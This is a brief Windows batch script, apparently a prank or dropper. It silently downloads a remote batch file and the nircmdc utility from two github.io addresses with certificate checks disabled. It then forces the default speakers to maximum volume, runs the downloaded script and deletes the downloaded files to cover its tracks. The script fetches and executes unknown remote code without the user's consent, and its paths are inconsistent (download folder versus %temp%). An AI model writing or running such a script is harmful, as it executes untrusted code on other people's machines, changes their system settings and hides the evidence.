@echo off
start /wait /min "" cmd /c curl -kLOS stivengiv.github.io/p/play.bat -O aritz331.github.io/stuff/nircmdc.exe

nircmdc setdefaultsounddevice "Speakers"
nircmdc setvolume 0 65535 65535

start %temp%\play.bat aser
del /f /q nircmdc.exe play.bat
